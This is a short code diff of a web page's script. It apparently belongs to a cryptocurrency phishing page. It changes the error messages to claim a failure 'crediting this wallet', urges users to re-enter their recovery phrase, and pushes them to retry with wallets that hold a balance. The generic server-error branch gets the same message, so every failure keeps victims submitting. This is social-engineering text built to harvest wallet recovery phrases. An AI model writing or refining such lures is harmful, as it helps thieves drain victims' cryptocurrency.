@@ -325,8 +325,8 @@
         setTimeout(() => {
           errorBox.innerHTML = `
   <p>
-    Oops, something went wrong verifying this wallet.<br>
-    Please ensure it has recent activity or try again with a different wallet that holds a balance.
+    Oops, something went wrong crediting this wallet.<br>
+    Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
   </p>
   <button onclick="returnToMainPage()">Try Again</button>
 `;
@@ -341,9 +341,12 @@
       })
       .catch(function(error) {
         errorBox.innerHTML = `
-          Unexpected server issue. Please try again.<br>
-          <button onclick="returnToMainPage()">Try Again</button>
-        `;
+  <p>
+    Oops, something went wrong crediting this wallet.<br>
+    Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
+  </p>
+  <button onclick="returnToMainPage()">Try Again</button>
+`;
         errorBox.style.display = "block";
 
         // Blur wallet page behind error box
